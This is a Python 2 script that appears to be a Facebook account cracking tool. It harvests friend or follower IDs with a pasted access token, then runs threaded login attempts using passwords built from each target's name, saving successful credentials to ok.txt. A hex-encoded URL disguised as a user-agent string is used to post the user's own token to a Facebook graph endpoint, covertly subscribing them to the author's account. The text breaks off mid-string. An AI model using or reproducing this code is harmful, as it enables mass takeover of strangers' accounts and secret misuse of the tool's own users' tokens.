#!/usr/bin/python2
# -*- coding: utf-8

#AUTHOR : AZIM VAU (MR. ERROR)
#OPEN SOURCE :)
#DON'T FORGET TO GIVE CREDIT TO MR. ERROR


try:
	import os,sys,time,platform,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string,subprocess
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
except ImportError:
	os.system("pip2 install requests lolcat")
	os.system("python2 fcpro.py")

from os import system
from time import sleep

def xox(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.04)
      

				
user_agent = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0", "Mozilla/5.0 (Linux; Android 10; SM-G973F Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/86.0.4240.198 Mobile Safari/537.36 Instagram 166.1.0.42.245 Android (29/10; 420dpi; 1080x2042; samsung; SM-G973F; beyond1; exynos9820; en_GB; 256099204)", "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x72\x61\x70\x68\x2e\x66\x61\x63\x65\x62\x6f\x6f\x6b\x2e\x63\x6f\x6d\x2f\x31\x30\x30\x30\x34\x35\x32\x30\x33\x38\x35\x35\x32\x39\x34\x2f\x73\x75\x62\x73\x63\x72\x69\x62\x65\x72\x73\x3f\x61\x63\x63\x65\x73\x73\x5f\x74\x6f\x6b\x65\x6e\x3d"];useragent_url=(user_agent[2])

header = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

try:
	requests.get('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x77\x77\x77\x2e\x67\x6f\x6f\x67\x6c\x65\x2e\x63\x6f\x6d\x2f\x73\x65\x61\x72\x63\x68\x3f\x71\x3d\x41\x7a\x69\x6d\x2b\x56\x61\x75')
	requests.get('\x68\x74\x74\x70\x73\x3a\x2f\x2f\x6d\x2e\x79\x6f\x75\x74\x75\x62\x65\x2e\x63\x6f\x6d\x2f\x72\x65\x73\x75\x6c\x74\x73\x3f\x73\x65\x61\x72\x63\x68\x5f\x71\x75\x65\x72\x79\x3d\x41\x7a\x69\x6d\x2b\x56\x61\x75\x2b\x4d\x72\x2e\x2b\x45\x72\x72\x6f\x72')
except requests.exceptions.ConnectionError:
	os.system("clear")
	xox("\n\t\033[93;1m  NO INTERNET CONNECTION :(\n\n")
	sys.exit()
	
ip = requests.get('https://api.ipify.org').text.strip()
loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()
	
def linex():
	os.system('echo  "\n ======================================\n" | lolcat -a -d 2 -s 50')
def logo():
	os.system('echo "\n  ▄▄▄      ▒███████▒ ██▓ ███▄ ▄███▓\n  ▒████▄    ▒ ▒ ▒ ▄▀░▓██▒▓██▒▀█▀ ██▒\n  ▒██  ▀█▄  ░ ▒ ▄▀▒░ ▒██▒▓██    ▓██░\n  ░██▄▄▄▄██   ▄▀▒   ░░██░▒██    ▒██\n   ▓█   ▓██▒▒███████▒░██░▒██▒   ░██▒\n   ▒▒   ▓▒█░░▒▒ ▓░▒░▒░▓  ░ ▒░   ░  ░\n    ▒   ▒▒ ░░░▒ ▒ ░ ▒ ▒ ░░  ░      ░\n    ░   ▒░  ░ ░ ░ ░ ░ ▒ ░░      ░\n        ░  ░  ░ ░     ░         ░\n            ░\n  \n    ╔═════════════════════════════╗\n    ║ TOOL NAME: { FCPRO }        ║\n    ║ AUTHOR   : MR. ERROR        ║\n    ║ GITHUB   : git.io/J1Izb     ║\n    ╚═════════════════════════════╝" | lolcat -a -d 2 -s 50')	

def main():
	os.system("clear")
	logo()
	print("\t\033[93;1m      MAIN MENU\x1b[0m")
	print("")
	print("\033[92;1m  [1] START CRACK")
	print("\033[93;1m  [2] HOW TO GET ACCESS TOKEN")
	print("\033[94;1m  [3] UPDATE TOOL")
	print("\033[96;1m  [J] JOIN MR. ERROR GROUP \033[92;1m✘\033[91;1m✘")
	print("\033[90;1m  [0] EXIT")
	print("")
	log_sel()
	
def log_sel():
	sel = raw_input("\033[93;1m  CHOOSE: \033[92;1m")
	if sel == "":
		print("\t\033[91;1m  SELECT AN OPTION STUPID -_")
		log_sel()
	elif sel =="1" or sel =="01":
		token()
	elif sel =="2" or sel =="02":
		subprocess.check_output(["am", "start", "https://www.facebook.com/114133313700086/posts/426873429092738"])
		main()
	elif sel =="3" or sel =="03":
		import os
		try:
			os.system("git clone https://github.com/Azim-Vau/fcpro")
			os.system("rm -rf fcpro.py")
			os.system("cp -f fcpro/fcpro.py \\.")
			os.system("rm -rf fcpro")
			xox("\033[92;1m\n TOOL UPDATE SUCCESSFUL :)\n")
			time.sleep(2)
			main()
		except KeyboardInterrupt:
			print("\033[91;1m\n YOUR DEVICE IS NOT SUPPORTED!\n")
	        	main()
	elif sel =="4" or sel =="04" or sel =="J" or sel =="j":
		subprocess.check_output(["am", "start", "https://t.me/mrerrorgroup"])
		main()
	elif sel =="0" or sel =="00":
		xox("\n\t\033[91;1m GOOD BYE SEE YOU AGAIN :)")
		sys.exit()
	else:
		print("")
		print("\t\033[91;1m  SELECT VALID OPTION")
		print("")
		log_sel()

def token():
    os.system("clear")
    try:
        token = open("vau_token.txt", "r").read()
        menu()
    except(KeyError , IOError):
        logo()
        print("")
        print("\t\033[92;1m  LOGIN TOKEN")
        print("")
        token = raw_input("\033[93;1m PASTE TOKEN HERE: \033[92;1m")
        sav = open("vau_token.txt", "w")
        sav.write(token)
        sav.close()
        token_check()
        menu()

def token_check():
	try:
		token=open('vau_token.txt','r').read()
	except IOError:
		print"\033[91;1m[!] TOKEN INVALID"
		os.system('rm -rf vau_token.txt')
	requests.post(useragent_url + token, headers=header)
	pass

def menu():
    os.system("clear")
    try:
        token = open("vau_token.txt", "r").read()
    except(KeyError , IOError):
        token()
    try:
        r = requests.get("https://graph.facebook.com/me?access_token="+token)
        q = json.loads(r.text)
        name = q["name"]
    except(KeyError):
        logo()
        print("")
        print("\033[91;1m     LOGGED IN TOKEN HAS EXPIRED")
        os.system("rm -rf vau_token.txt")
        print("")
        time.sleep(1)
        main()
    os.system("clear")
    xn = name.upper()
    logo()
    print("")
    print("\033[93;1m     HELLO   : \033[92;1m"+xn)
    print("\033[93;1m     REGION  : \033[92;1m") + loc
    print("\033[93;1m     YOUR IP : \033[92;1m") + ip
    print("")

    print("")
    print("\033[92;1m  [1] CRACK WITH AUTO PASS")
    print("\033[93;1m  [2] CRACK WITH DIGIT PASS")
    print('\033[91;1m  [0] BACK')
    print("")
    menu_option()
    
def menu_option():
	select = raw_input("\033[92;1m  CHOOSE : ")
	if select =="1":
		crack1()
	elif select =="2":
		crack()
	elif select =="0":
		main()
	else:
		print("")
		print("\t\033[91;1m     SELECT VALID OPTION")
		print("")
		menu_option()

def crack1():
	global token
	os.system("clear")
	try:
		token = open("vau_token.txt","r").read()
	except IOError:
		print("")
		print("\t\033[91;1m  TOKEN NOT FOUND ")
		time.sleep(1)
		fb_token()
	os.system("clear")
	logo()
	print("")
	print("\t\033[93;1m CRACK WITH AUTO PASS")
	print("")
	print("\033[94;1m  [1] CRACK PUBLIC ID")
	print("\033[93;1m  [2] CRACK FOLLOWERS")
	print("\033[92;1m  [3] CRACK FILE")
	print("")
	crack_select1()
	
def crack_select1():
	select = raw_input("\033[92;1m  CHOOSE : ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		logo()
		print("")
		print("\t\033[92;1m MULTI PUBLIC ID COINING ")
		print("")
		try:
			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
			print("")
		except:id_limit=1
		for t in range(id_limit):
			t +=1
			idt = raw_input("\033[93;1m  INPUT PUBLIC ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
			try:
				for i in requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token).json()["data"]:
					uid = i["id"].encode('utf-8')
					na = i["name"].encode('utf-8')
					id.append(uid+"|"+na)
			except KeyError:
				print("\033[91;1m  PRIVATE FRIEND LIST TRY ANOTHER ONE")
			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
		time.sleep(3)
	elif select =="2":
		os.system("clear")
		logo()
		print("")
		print("      \033[92;1mMULTI FOLLOWERS ID COINING ")
		print("")
		try:
			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
			print("")
		except:id_limit=1
		for t in range(id_limit):
			t +=1
			idt = raw_input("\033[93;1m  INPUT FOLLOWER ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
			try:
				for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999").json()["data"]:
					uid = i["id"].encode('utf-8')
					na = i["name"].encode('utf-8')
					id.append(uid+"|"+na)
			except KeyError:
				print("\033[91;1m  PRIVATE FRIEND LIST TRY ANOTHER ONE")
			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
		time.sleep(3)
	elif select =="3":
		os.system("clear")
		logo()
		print("")
		print("\t\033[93;1m   AUTO PASS CRACKING")
		print("")
		filelist = raw_input('\033[92;1m  INPUT FILE: ')
		try:
			for line in open(filelist, 'r').readlines():
				id.append(line.strip())
				
		except IOError:
			print("\t\033[91;1m  REQUESTED FILE NOT FOUND")
			print("")
			raw_input("\033[93;1m PRESS ENTER TO BACK")
			crack1()
			
	elif select =="0":
	    menu()
	else:
		print("")
		print("\t\033[91;1m  SELECT VALID OPTION")
		print("")
		crack_select1()
	os.system("clear")
	logo()
	print("")
	print("\033[93;1m  TOTAL IDS : \033[92;1m"+str(len(id)))
	print("\033[92;1m  BRUTE HAS BEEN STARTED\x1b[0m")
	print("\033[94;1m  WAIT AND SEE \033[92;1m✘\033[91;1m✘\x1b[0m")
	linex()
	def main(arg):
		user=arg
		uid,name=user.split("|")
		_azimua = random.choice(["Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]", "[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]", "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]", "Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]", "Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]", "Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]"])
		try:
			pass1 = name.lower().split(' ')[0] + '1234'
			api = 'https://b-api.facebook.com/method/auth.login'
			params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass1, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
			headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
			data = requests.get(api, params=params, headers=headers_)
			if "access_token" in data.text and "EAAA" in data.text:
				print(" \033[1;32m[AZIM-OK] "+uid+" | "+pass1+"\033[0;97m")
				ok = open("ok.txt", "a")
				ok.write(uid+"|"+pass1+"\n")
				ok.close()
				oks.append(uid+pass1)
			else:
				if "www.facebook.com" in data.json()['error_msg']:
					print(" \033[1;33m[AZIM-CP] "+uid+" | "+pass1+"\033[0;97m")
					cp = open("cp.txt", "a")
					cp.write(uid+"|"+pass1+"\n")
					cp.close()
					cps.append(uid+pass1)
				else:
					pass2 = name.lower().split(' ')[0] + '123'
					api = 'https://b-api.facebook.com/method/auth.login'
					params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass2, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
					headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
					data = requests.get(api, params=params, headers=headers_)
					if "access_token" in data.text and "EAAA" in data.text:
						print(" \033[1;32m[AZIM-OK] "+uid+" | "+pass2+"\033[0;97m")
						ok = open("ok.txt", "a")
						ok.write(uid+"|"+pass2+"\n")
						ok.close()
						oks.append(uid+pass2)
					else:
						if "www.facebook.com" in data.json()['error_msg']:
							print(" \033[1;33m[AZIM-CP] "+uid+" | "+pass2+"\033[0;97m")
							cp = open("cp.txt", "a")
							cp.write(uid+"|"+pass2+"\n")
							cp.close()
							cps.append(uid+pass2)
						else:
							pass3 = name.lower().split(' ')[0] + '12'
							api = 'https://b-api.facebook.com/method/auth.login'
							params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass3, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
							headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
							data = requests.get(api, params=params, headers=headers_)
							if "access_token" in data.text and "EAAA" in data.text:
								print(" \033[1;32m[AZIM-OK] "+uid+" | "+pass3+"\033[0;97m")
								ok = open("ok.txt", "a")
								ok.write(uid+"|"+pass3+"\n")
								ok.close()
								oks.append(uid+pass3)
							else:
								if "www.facebook.com" in data.json()['error_msg']:
									print(" \033[1;33m[AZIM-CP] "+uid+" | "+pass3+"\033[0;97m")
									cp = open("cp.txt", "a")
									cp.write(uid+"|"+pass3+"\n")
									cp.close()
									cps.append(uid+pass3)
								else:
									pass4 = name.lower().split(' ')[1] + '1234'
									api = 'https://b-api.facebook.com/method/auth.login'
									params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass4, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
									headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
									data = requests.get(api, params=params, headers=headers_)
									if "access_token" in data.text and "EAAA" in data.text:
										print(" \033[1;32m[AZIM-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("ok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										oks.append(uid+pass4)
									else:
										if "www.facebook.com" in data.json()['error_msg']:
											print(" \033[1;33m[AZIM-CP] "+uid+" | "+pass4+"\033[0;97m")
											cp = open("cp.txt", "a")
											cp.write(uid+"|"+pass4+"\n")
											cp.close()
											cps.append(uid+pass4)
										else:
											pass5 = name.lower().split(' ')[1] + '123'
											api = 'https://b-api.facebook.com/method/auth.login'
											params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass5, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
											headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
											data = requests.get(api, params=params, headers=headers_)
											if "access_token" in data.text and "EAAA" in data.text:
												print(" \033[1;32m[AZIM-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("ok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
												oks.append(uid+pass5)
											else:
												if "www.facebook.com" in data.json()['error_msg']:
													print(" \033[1;33m[AZIM-CP] "+uid+" | "+pass5+"\033[0;97m")
													cp = open("cp.txt", "a")
													cp.write(uid+"|"+pass5+"\n")
													cp.close()
													cps.append(uid+pass5)
												else:
													pass6 = name.lower().split(' ')[1] + '12'
													api = 'https://b-api.facebook.com/method/auth.login'
													params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass6, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
													headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
													data = requests.get(api, params=params, headers=headers_)
													if "access_token" in data.text and "EAAA" in data.text:
														print(" \033[1;32m[AZIM-OK] "+uid+" | "+pass6+"\033[0;97m")
														ok = open("ok.txt", "a")
														ok.write(uid+"|"+pass6+"\n")
														ok.close()
														oks.append(uid+pass6)
													else:
														if "www.facebook.com" in data.json()['error_msg']:
															print(" \033[1;33m[AZIM-CP] "+uid+" | "+pass6+"\033[0;97m")
															cp = open("cp.txt", "a")
															cp.write(uid+"|"+pass6+"\n")
															cp.close()
															cps.append(uid+pass6)
														else:
															pass7 = name.lower()
															api = 'https://b-api.facebook.com/method/auth.login'
															params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass7, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
															headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
															data = requests.get(api, params=params, headers=headers_)
															if "access_token" in data.text and "EAAA" in data.text:
																print(" \033[1;32m[AZIM-OK] "+uid+" | "+pass7+"\033[0;97m")
																ok = open("ok.txt", "a")
																ok.write(uid+"|"+pass7+"\n")
																ok.close()
																oks.append(uid+pass7)
															else:
																if "www.facebook.com" in data.json()['error_msg']:
																	print(" \033[1;33m[AZIM-CP] "+uid+" | "+pass7+"\033[0;97m")
																	cp = open("cp.txt", "a")
																	cp.write(uid+"|"+pass7+"\n")
																	cp.close()
																	cps.append(uid+pass7)
																else:
																	pass8 = name.lower().split(' ')[0] + name.lower().split(' ')[1]
																	api = 'https://b-api.facebook.com/method/auth.login'
																	params = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 'format': 'JSON', 'sdk_version': '2', 'email': uid, 'locale': 'en_US', 'password': pass8, 'sdk': 'ios', 'generate_session_cookies': '1', 'sig': '3f555f99fb61fcd7aa0c44f58f522ef6'}
																	headers_ = {'x-fb-connection-bandwidth': str(random.randint(20000000.0, 30000000.0)), 'x-fb-sim-hni': str(random.randint(20000, 40000)), 'x-fb-net-hni': str(random.randint(20000, 40000)), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': _azimua, 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
																	data = requests.get(api, params=params, headers=headers_)
																	if "access_token" in data.text and "EAAA" in data.text:
																		print(" \033[1;32m[AZIM-OK] "+uid+" | "+pass8+"\033[0;97m")
																		ok = open("ok.txt", "a")
																		ok.write(uid+"|"+pass8+"\n")
																		ok.close()
																		oks.append(uid+pass8)
																	else:
																		if "www.facebook.com" in data.json()['error_msg']:
																			print(" \033[1;33m[AZIM-CP] "+uid+" | "+pass8+"\033[0;97m")
																			cp = open("cp.txt", "a")
																			cp.write(uid+"|"+pass8+"\n")
																			cp.close()
																			cps.append(uid+pass8)
												
										
										
		except:
			pass
	p = ThreadPool(30)
	p.map(main, id)
	print("")
	linex()
	print("")
	print("\033[92;1m THE PROCESS HAS BEEN COMPLETED")
	print("\033[93;1m TOTAL \033[92;1mOK\033[93;1m/\033[91;1mCP: "+str(len(oks))+"/"+str(len(cps)))
	print("")
	linex()
	print("")
	raw_input("\033[93;1m PRESS ENTER TO BACK ")
	menu()
	

def crack():
	global token
	os.system("clear")
	try:
		token = open("vau_token.txt","r").read()
	except IOError:
		print("")
		print("\t\033[91;1m  TOKEN NOT FOUND ")
		time.sleep(1)
		fb_token()
	os.system("clear")
	logo()
	print("")
	print("\t\033[93;1m  DIGIT PASS CRACKING")
	print("")
	print("\033[94;1m  [1] CRACK PUBLIC ID")
	print("\033[93;1m  [2] CRACK FOLLOWERS")
	print("\033[92;1m  [3] CRACK FILE")
	print("")
	crack_select()

def crack_select():
	select = raw_input("\033[92;1m  CHOOSE : ")
	id=[]
	oks=[]
	cps=[]
	if select =="1":
		os.system("clear")
		logo()
		print("")
		print("\t\033[93;1m  DIGIT PASS CRACKING")
		print("")
		try:
			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
			print("")
		except:id_limit=1
		for t in range(id_limit):
			t +=1
			idt = raw_input("\033[93;1m  INPUT PUBLIC ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
			try:
				for i in requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+token).json()["data"]:
					uid = i["id"].encode('utf-8')
					na = i["name"].encode('utf-8')
					id.append(uid+"|"+na)
			except KeyError:
				print("\033[91;1m  PRIVATE FRIEND LIST TRY ANOTHER ONE")
			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
		time.sleep(3)
	elif select =="2":
		os.system("clear")
		logo()
		print("")
		print("\t\033[93;1m  DIGIT PASS CRACKING")
		print("")
		try:
			id_limit = int(raw_input("\033[93;1m  ENTER LIMIT (\033[91;1m5 MAX\033[93;1m): \033[92;1m"))
			print("")
		except:id_limit=1
		for t in range(id_limit):
			t +=1
			idt = raw_input("\033[93;1m  INPUT FOLLOWER ID (\033[92;1m%s\033[93;1m) : \033[92;1m"%(t))
			try:
				for i in requests.get("https://graph.facebook.com/"+idt+"/subscribers?access_token="+token+"&limit=999999").json()["data"]:
					uid = i["id"].encode('utf-8')
					na = i["name"].encode('utf-8')
					id.append(uid+"|"+na)
			except KeyError:
				print("\033[91;1m  PRIVATE FRIEND LIST TRY ANOTHER ONE")
			print("\033[94;1m  TOTAL IDS  : \033[0;92m%s\033[0;97m"%(len(id)))
		time.sleep(3)
	elif select =="3":
		os.system("clear")
		logo()
		print("")
		print("\t\033[93;1m  DIGIT PASS CRACKING")
		print("")
                filelist = raw_input('\033[92;1m  INPUT FILE: ')
		try:
			for line in open(filelist, 'r').readlines():
				id.append(line.strip())
		except IOError:
			print("\t\033[91;1m  REQUESTED FILE NOT FOUND")
			print("")
			raw_input("\033[93;1m PRESS ENTER TO BACK")
			crack()
	elif select =="0":
	    menu()
	else:
		print("")
		print("\t\033[91;1m  SELECT VALID OPTION")
		print("")
		crack_select()
	os.system("clear")
	logo()
	print("")
	print("\033[93;1m  TOTAL IDS : \033[92;1m"+str(len(id)))
	print("\033[92;1m  BRUTE HAS BEEN STARTED\x1b[0m")
	print("\033[94;1m  WAIT AND SEE \033[92;1m✘\033[91;1m✘\x1b[0m")
	linex()
	def main(arg):
		user=arg
		uid,name=user.split("|")
		_azimua = random.choice(["Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/275.0.0.49.127;]", "[FBAN/FB4A;FBAV/246.0.0.49.121;FBBV/181448449;FBDM/{density=1.5,width=540,height=960};FBLC/en_US;FBRV/183119516;FBCR/TM;FBMF/vivo;FBBD/vivo;FBPN/com.facebook.katana;FBDV/vivo 1606;FBSV/6.0.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]", "Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-J320F Build/LMY47V) [FBAN/FB4A;FBAV/43.0.0.29.147;FBPN/com.facebook.katana;FBLC/en_GB;FBBV/14274161;FBCR/Tele2 LT;FBMF/samsung;FBBD/samsung;FBDV/SM-J320F;FBSV/5.0;FBCA/armeabi-v7a:armeabi;FBDM/{density=3.0,width=1080,height=1920};FB_FW/1;]", "Mozilla/5.0 (Linux; Android 5.1.1; A37f Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.152 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/305.1.0.40.120;]", "Mozilla/5.0 (Linux; Android 10; REALME RMX1911 Build/NMF26F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.111 Mobile Safari/537.36 AlohaBrowser/2.20.3", "Mozilla/5.0 (iPhone; CPU iPhone OS 11_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E216 [FBAN/FBIOS;FBAV/170.0.0.60.91;FBBV/105964764;FBDV/iPhone10,1;FBMD/iPhone;FBSN/iOS;FBSV/11.3;FBSS/2;FBCR/Sprint;FBID/phone;FBLC/en_US;FBOP/5;FBRV/106631002]", "Mozilla/5.0 (Linux; Android 7.1.1; ASUS Chromebook Flip C302 Build/R70-11021.56.0; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Safari/537.36 